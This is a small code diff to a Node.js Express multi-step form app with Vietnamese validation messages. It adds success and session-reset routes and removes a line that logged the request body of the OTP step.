@@ -86,6 +86,13 @@ app.get("/Buoc-3",(req,res)=>{
     }
     
 })
+app.get("/success",(req,res)=>{
+    res.render("thanhcong");
+})
+app.get("/reset",(req,res)=>{
+    req.session.InfoId=null;
+    res.redirect("/");
+})
 app.post("/",(req,res)=>{
    
     req.checkBody('SDT').notEmpty().withMessage("Vui Lòng Nhập Số Điện Thoại").isNumeric().withMessage("Vui Lòng Nhập Đúng SDT");
@@ -156,7 +163,6 @@ app.post("/actionstep2",(req,res)=>{
      })
 })
 app.post("/actionstep3",(req,res)=>{
-    console.log(req.body);
     var obj={
         OTP:req.body.OTP
     }
